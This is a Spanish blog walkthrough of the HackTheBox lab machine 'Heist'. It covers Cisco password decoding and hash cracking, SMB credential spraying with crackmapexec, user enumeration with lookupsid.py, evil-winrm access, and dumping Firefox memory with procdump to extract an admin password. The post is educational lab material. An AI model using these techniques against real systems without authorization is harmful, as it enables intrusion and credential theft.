---
layout      : post
title       : "HackTheBox - Heist"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201banner.png
category    : [ htb ]
tags        : [ SMB, cracking, cisco, procdump, lookupsid.py, firefox ]
---
Máquina **Windows** nivel fácil, jugaremos con crackeo de passwords **Cisco**, movimientos laterales para encontrar usuarios a los cuales no teníamos acceso yyyyyy dumpearemos procesos de **Firefox** para ver que está pasando por detrás.

![201heistHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201heistHTB.png)

### TL;DR (Spanish writeup)

**Creada por**: [MinatoTW](https://www.hackthebox.eu/profile/8308).

Bonito camino para un camino bonito.

Nos enfrentaremos a un servicio web enfocado en "Soporte", enumerando la web veremos que existe un apartado de *issues*, en un comentario de un usuario llamado **hazard** tendremos un archivo con la configuración de un router, de ahí obtendremos vaaaarias contraseñas encriptadas **Cisco** (con usuarios), jugaremos para desencriptarlas. Lograremos encontrar una contraseña válida par el usuario **Hazard** contra el servicio **SMB** (:

Pero con esas credenciales no tendremos acceso a ninguna carpeta compartida interesante ni serán funcionales para jugar con **evil-winrm**... Enumerando el servicio **SMB** encontraremos la herramienta [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py) que nos permitirá enumerar usuarios locales del la máquina. Volviendo a validar las credenciales obtenidas anteriormente, pero ahora con los nuevos usuarios conseguiremos que unas sean válidas contra el usuario **Chase**, las usaremos para obtener una **PowerShell** en el sistema.

Enumerando el sistema nos daremos cuenta de que **Firefox** está instalado (es curioso, ya que normalmente no lo esta :P) yyyy que hay procesos siendo ejecutados actualmente por él, usaremos la herramienta **procdump.exe** para dumpear todo lo relacionado a algún proceso **Firefox**, tendremos que jugar con ese dump para buscar cositas, finalmente encontraremos unas credenciales que intentan logearse contra el servicio web de "Soporte", curiosamente son del admin de la web, tomaremos esa contraseña y haciendo reutilización de credenciales conseguiremos una **PowerShell** como el usuario **Administrator** en el sistema.

...

#### Clasificación de la máquina

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;"/>

Algo de suciedad en las manos con muchas ganas de llegar a ser real.

> Escribo para tener mis "notas", por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.

...

A recorrer caminos saltando entre nubes 🌆

1. [Enumeración](#enumeracion).
  * [Escaneos con **nmap**](#enum-nmap).
  * [Enumeración web (puerto 80)](#puerto-80).
2. [Explotación](#explotacion).
  * [Crackeando passwords de Cisco](#cracking-config-txt).
  * [Obteniendo credenciales válidas contra el servicio **SMB**](#finding-valid-creds).
3. [Movimiento lateral - Enumerando usuarios locales (no podemos hacer nada con los anteriores 🤪)](#movimiento-lateral-enum-users).
4. [Escalada de privilegios](#escalada-de-privilegios).

...

## Enumeración [#](#enumeracion) {#enumeracion}

...

### Enumeración de puertos con nmap [⌖](#enum-nmap) {#enum-nmap}

Como siempre, empezaremos validando que puertos hay activos (y visibles externamente) en la máquina, usaremos **nmap** para este propósito:

```bash
❱ nmap -p- --open -v 10.10.10.149 -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535                      |
| --open    | Solo los puertos que están abiertos          |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png) de [S4vitar](https://s4vitar.github.io/) que me extrae los puertos en la clipboard |

Obtenemos:

```bash
❱ cat initScan
# Nmap 7.80 scan initiated Sat Jun 12 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.149
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.149 () Status: Up
Host: 10.10.10.149 () Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///, 445/open/tcp//microsoft-ds///  Ignored State: filtered (65532)
# Nmap done at Sat Jun 12 25:25:25 2021 -- 1 IP address (1 host up) scanned in 309.35 seconds
```

| Puerto | Descripción |
| ------ | :---------- |
| 80      | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Servidor web |
| 135,445 | **[SMB](https://www.varonis.com/blog/smb-port/)**: Nos permite compartir información a través de una red de nodos. |

Ahora haremos un escaneo de versiones y scripts relacionados con los puertos encontrados, así lograremos obtener información muuucho más concreta de lo que tenemos:

**~·~·~(Para copiar los puertos directamente en la clipboard, hacemos uso de la función referenciada antes (`extractPorts`)**
 
```bash
❱ extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.149
    [*] Open ports: 80,135,445

[*] Ports copied to clipboard
```

**)~·~·~**

```bash
❱ nmap -p 80,135,445 -sC -sV 10.10.10.149 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

Y obtenemos como resultado:

```bash
❱ cat portScan
# Nmap 7.80 scan initiated Sat Jun 12 25:25:25 2021 as: nmap -p 80,135,445 -sC -sV -oN portScan 10.10.10.149
Nmap scan report for 10.10.10.149
Host is up (0.11s latency).

PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
135/tcp open  msrpc         Microsoft Windows RPC
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 11m07s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-06-12T14:40:28
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 12 25:25:25 2021 -- 1 IP address (1 host up) scanned in 53.67 seconds
```

Cositas relevantes de nuestro escaneo:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 80     | HTTP     | Microsoft IIS httpd 10.0 |

Info del servidor web:

* Título: **Support Login Page**
* Recurso: `login.php`

Bien, por ahora no tenemos nada más, así que a enumerar (:

...

### Puerto 80 [⌖](#puerto-80) {#puerto-80}

![201page80](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201page80.png)

Tenemos un **panel login** de una plataforma de "soporte". Probando credenciales nos redirige a `/errorpage.php` al ser inválidas ):

Hay un link que nos permite ingresar al sitio como invitados (guest), si damos clic llegamos a `/issues.php`:

![201page80_issues](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201page80_issues.png)

Bien, vemos varias cosas:

* "*Here's a part of the configuration*": Haciendo referencia al **Attachment** que agrego al comentario.
  * Que si damos clic nos redirige a `/attachments/config.txt`. (Ya lo miraremos)
* "*please create an account for me on the windows server as I need to access the files*": Sabemos que hay una cuenta llamada **Hazard**.
  * Puede hacer referencia al portal web (pero también podemos pensar que existe en el servidor **SMB** (al hablar de "access the files"))

Veamos `config.txt`:

![201page80_attachment_configTXT](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201page80_attachment_configTXT.png)

Estamos ante un archivo de configuracion de un router de **Cisco**, dentro hay data de usuarios:

![201page80_attachment_configTXT_creds](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201page80_attachment_configTXT_creds.png)

Perfecto, tenemos:

* Un **hash** tipo Cisco-IOS: `$1$pdQG$o8nrSzsGXeaduXrjlvKc91`:
  * Según [example-hashes](https://hashcat.net/wiki/doku.php?id=example_hashes). (Filtrando en toda la web por `$1$`)
* Tres usuarios: `secret`, `rout3r` y `admin` con sus respectivas contraseñas, pero están encriptadas :P

...

## Explotación [#](#explotacion) {#explotacion}

...

### Crackeo de passwords archivo config.txt [⌖](#cracking-config-txt) {#cracking-config-txt}

Buscando en internet un poco más de enfoque y entendimiento, llegamos a este recurso donde explican la diferencia entre `enable password` y `enable secret` (en nuestro caso `\<username\> password` y `enable secret`):

**(Lo que importa entender es la diferencia entre `secret` y `password`)**

* [Enable password vs Enable secret](https://www.net4us.com.mx/single-post/2016/06/05/enable-password-vs-enable-secret).

> La diferencia recae en que el comando `enable password` encripta el password, (por lo que se puede desencriptar) y `enable secret` crea un hash a partir del password y este "no" se puede "desencriptar".

Teniendo esto en mente y tomando como ejemplo lo que tenemos del archivo `config.txt`, entendemos que:

```txt
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
```

* `5`: Es el [formato en el que está encriptado](https://www.cisco.com/c/m/en_us/techdoc/dc/reference/cli/n5k/commands/enable-secret.html).

```txt
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
```

* Pasa exactamente lo mismo acá, el `7` es el formato en el que está encriptado.

Bien, siguiendo el artículo de las diferencias](https://www.net4us.com.mx/single-post/2016/06/05/enable-password-vs-enable-secret) vemos que las contraseñas pueden ser crackeadas, nos provee con un recurso encargado de ello:

* [http://www.ifm.net.nz/cookbooks/passwordcracker.html](http://www.ifm.net.nz/cookbooks/passwordcracker.html).

Simplemente debemos colocar las contraseñas encriptadas al usar `password` como comando, o sea:

* `0242114B0E143F015F5D1E161713`.

![201google_cisco_cracker_rout3r](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201google_cisco_cracker_rout3r.png)

* `02375012182C1A1D751618034F36415408`.

![201google_cisco_cracker_admin](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201google_cisco_cracker_admin.png)

Bien, conseguimos crackear las dos contraseñas, pero aún nos queda jugar con el **hash** y ver si podemos crackearlo también, buscando un poco más llegamos a este recurso que nos muestra varios ejemplos con diferentes formatos de hashes en Cisco (0, 4, 5, 7, 8 y 9):

* [Cisco password cracking and decrypting guide](https://www.infosecmatter.com/cisco-password-cracking-and-decrypting-guide/).

Viendo cada uno, [nos fijamos en el formato **5**](https://www.infosecmatter.com/cisco-password-cracking-and-decrypting-guide/#cisco-type-5-password), ya que es idéntico (el inicio del hash = identificador del hash) al nuestro:

![201google_cisco_password_type5](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201google_cisco_password_type5.png)

Yyy nos da el comando para intentar crackearlo, así que guardamos el hash en un archivo (lo llamaremos `secret.hash`) y ejecutamos:

```bash
❱ john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt secret.hash
```

```bash
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])  
Press 'q' or Ctrl-C to abort, almost any other key for status
stealth1agent    (?)
...
Session completed
```

Perfecto, conseguimos en texto plano la cadena `stealth1agent`.

Aprovechemos para hacer el mismo proceso pero ahora con **hashcat**:

```bash
❱ hashcat -m 500 -a 0 secret.hash /usr/share/wordlists/rockyou.txt -o cracked.txt
```

* `-m`: Tipo de hash (500 al ser md5crypt).
* `-a`: Ataque tipo diccionario (para pasarle despues el wordlist).
* `-o`: Cuando haga la crakeazhion, guardara el resultado en el archivo `cracked.txt`.

Ejecutamos yyyyy:

```bash
❱ cat cracked.txt 
$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent
```

Perfecto, el mismo resultado.

...

### Encontrando credenciales válidas contra *SMB* [⌖](#finding-valid-creds) {#finding-valid-creds}

Ahora que tenemos todas las contraseñas en texto plano y algunos usuarios, pues empecemos a probar y ver si en algún servicio son válidas.

**SMB**:

Usemos [crackmapexec](https://www.elladodelmal.com/2020/05/crackmapexec-una-navaja-suiza-para-el.html) para ir validándolas contra *samba*:

```bash
❱ crackmapexec smb 10.10.10.149 
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)  
```

* Obtenemos más info relevante, sistema operativo yyy dominio.

Jugando con los usuarios del archivo `config.txt` no logramos obtener nada, peeeero, si recordamos habíamos hablado que podría existir el usuario **hazard**, pueeeeees:

```bash
❱ crackmapexec smb 10.10.10.149 -u 'hazard' -p 'incorrecta' 
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)  
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\hazard:incorrecta STATUS_LOGON_FAILURE 
```

```bash
❱ crackmapexec smb 10.10.10.149 -u 'hazard' -p 'stealth1agent'
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)  
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent 
```

Lindo, las credenciales `hazard:stealth1agent` son válidas contra el servidor **samba** (: Veamos si tenemos recursos disponibles:

```bash
❱ smbmap -H 10.10.10.149 -u 'hazard' -p 'stealth1agent'
[+] IP: 10.10.10.149:445        Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share  
        IPC$                                                    READ ONLY       Remote IPC
```

Ningún recurso útil ):

Probando en la web con las credenciales tampoco logramos nada nuevo. Entonces pensé que si no funcionan contra la web, probablemente no sea una explotación web lo que debamos hacer.

Entonces necesitaríamos algún servicio para probarlas, algo así como "**SSH**" así que recordé el servicio **WinRM** (que no fue descubierto en nuestro escaneo, pero pueda que simplemente se le haya pasado), así que volviendo a hacer el escaneo de **nmap** encontramos el puerto **5985**, el cual mantiene por lo general el servicio **WinRM**:

```bash
❱ nmap -p- --open -v 10.10.10.149 
...
Discovered open port 5985/tcp on 10.10.10.149
...
```

Y sí, estaba abierto, a veces pasa que el escaneo inicial no toma algunos puertos, entonces pues es bueno volver a ejecutarlo y así confirmamos o añadimos información.

> **WinRM** permite realizar tareas administrativas remotamente (en pocas palabras). [Intro WinRM Windows](https://geeks.ms/eliasmereb/2011/04/14/introduccin-a-winrm-para-windows-server-2008-r2/).

Nos podemos aprovechar de **WinRM** para explotarlo mediante la herramienta [evil-winrm](https://www.hackplayers.com/2019/10/evil-winrm-shell-winrm-para-pentesting.html), para en caso de contar con credenciales válidas, probablemente conseguir una **PowerShell** en el sistema.

Pero intentando con `hazard` no lo logramos ): Así que tamos F...

...

## Movimiento lateral : Enumerando usuarios locales [#](#movimiento-lateral-enum-users) {#movimiento-lateral-enum-users}

Siguiendo [esta guía](https://book.hacktricks.xyz/pentesting/pentesting-smb) para enumerar **SMB** encontramos una herramienta para probar:

> Enumerate local users with [SID](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows) brute-forcing.

Apoyándonos del repositorio [impacket](https://github.com/SecureAuthCorp/impacket) usamos la herramienta [lookupsid.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/lookupsid.py) para el brute-forcing:

```bash
❱ lookupsid.py SUPPORTDESK/Hazard:stealth1agent@10.10.10.149
Impacket v0.9.22.dev1+20200909.150738.15f3df26 - Copyright 2020 SecureAuth Corporation   

[*] Brute forcing SIDs at 10.10.10.149
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
```

Opa, obtenemos los usuarios locales yyyy no solo esta **Hazard**, al menos ya tenemos más para probar, así que hagámoslo sencillo, guardemos toooodas las credenciales en un archivo y con **crackmapexec** hagamos que vaya probando de una en una. Así no tenemos que hacerlo a mano :P

```bash
❱ cat users.txt 
Administrator
Guest
DefaultAccount
WDAGUtilityAccount
None
support
Chase
Jason
secret
admin
rout3r
stealth1agent
Q4)sJu\Y8qz*A3?d
$uperP@ssword
```

Y ahora le pasamos el archivo:

```bash
❱ crackmapexec smb 10.10.10.149 -u users.txt -p users.txt                                                                
```

Despues de un pequeño rato obtenemos:

![201bash_crackmapexec_user_chase](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201bash_crackmapexec_user_chase.png)

Unas nuevas credenciales, pues volvamos a probar con todas las opciones a ver...

Finalmente ante **evil-winrm** conseguimos una **PowerShell**:

![201bash_evilwinrm_chase](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201bash_evilwinrm_chase.png)

aksldfjlkajskleu (:

...

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Enumerando el sistema encontramos varias cositas:

```powershell
*Evil-WinRM* PS C:\Users\Chase\Desktop> type todo.txt
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access for guest user.
```

Una lista de tareas...

Podemos destacar algo "raro" de las cosas por hacer, nos indica que: *Se mantendrá un chequeo constante a la lista de problemas*, esto es llamativo porque a menos que tengan una persona todo el tiempo (todo el tiempo real, ahí mirando a cada rato) debe existir algún proceso monitoreando esa lista de problemas, ¿no?

Esto toma algo de sentido cuando enumeramos los programas instalados en el sistema:

```powershell
*Evil-WinRM* PS C:\> dir "Program Files"

    Directory: C:\Program Files

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
...
d-----        2/18/2021   4:21 PM                Mozilla Firefox
...
```

**Primero**, es un proceso activo, lo digo por la fecha y **segundo**, *Firefox* no viene instalado por default en **Windows**, así que eso nos debe llamar la atención...

Validando, efectivamente **Firefox** esta activo y ejecutando "algo":

```powershell
*Evil-WinRM* PS C:\> ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName  
-------  ------    -----      -----     ------     --  -- -----------  
...
   1052      70   149408     224568       6.69   6184   1 firefox
    347      20     9788      34516       0.05   6292   1 firefox
    401      34    32124      92720       0.92   6436   1 firefox
    378      28    22300      59200       0.48   6732   1 firefox
    355      25    16336      38980       0.14   6996   1 firefox
...
```

Bien, tenemos varias cositas para ir detrás de **Firefox**, podemos aprovechar esos procesos para dumpear lo que esta pasando mientras están activos, para esto podemos usar [procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump), así que descarguémoslo (en el anterior link esta también el binario) yyy subámoslo a la máquina:

```powershell
*Evil-WinRM* PS C:\Users\Chase\Videos> dir 

    Directory: C:\Users\Chase\Videos

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/13/2021  25:25 FM         725368 procdump.exe
```

Entonces, tomemos uno de los procesos que esta ejecutando **Firefox**, como por ejemplo el primero:

```powershell
*Evil-WinRM* PS C:\> ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName  
-------  ------    -----      -----     ------     --  -- -----------  
...
   1052      70   149408     224568       6.69   6184   1 firefox
...
```

Sacamos el **Id** y ejecutamos el dumpeo:

```powershell
*Evil-WinRM* PS C:\Users\Chase\Videos> .\procdump.exe -ma 6184
```

> `-ma` : Write a dump file with all process memory.

```powershell
[02:14:28] Dump 1 initiated: C:\Users\Chase\Videos\firefox.exe_210613_021428.dmp
[02:14:28] Dump 1 writing: Estimated dump file size is 508 MB.
[02:14:28] Dump 1 complete: 509 MB written in 0.6 seconds
[02:14:29] Dump count reached.
```

Y obtenemos:

```powershell
*Evil-WinRM* PS C:\Users\Chase\Videos> dir

    Directory: C:\Users\Chase\Videos

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/13/2021  25:25 FM      520222307 firefox.exe_210613_021428.dmp
```

Bien, pues ahora nos queda jugar con el como cualquier archivo con información...

Despues de un rato, jugando con [Select-String](https://antjanus.com/blog/web-development-tutorials/how-to-grep-in-powershell/) (similar al **grep** de toda la vida, pero para **PowerShell**) filtrando por "**password**" encontramos unas credenciales que están intentando iniciar sesión en el login que ya conocimos:

![201bash_evilwinrm_dump_password](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201bash_evilwinrm_dump_password.png)

Vemos esta línea:

```txt
"C:\Program Files\Mozilla Firefox\firefox.exe" localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=  
```

De la cual obtenemos un correo y una contraseña:

* `admin@support.htb`:`4dD!5}x/re8]FBuZ`.

Probándolas en la web son válidas y nos redirigen al apartado de problemas (`/issues.php`), pero haciendo reutilización de contraseñas logramos una **PowerShell** como el usuario *Administrator* en el sistema:

![201bash_evilwinrm_administrator](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201bash_evilwinrm_chase.png)

BIEEEEEEEEEEEEEEEN, solo nos queda ver las flags mi perritoowowowo:

![201flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/heist/201flags.png)

...

Linda experiencia, el movernos de un usuario para encontrar otros usuarios me gusto un montón (además de tener otra herramienta en la mente para próximas máquinas). El dumpeo estuvo interesante, jugar con procesos para ver que esta pasando por detrás, nice!

Y como siempre: A seguir rompiendo todo!!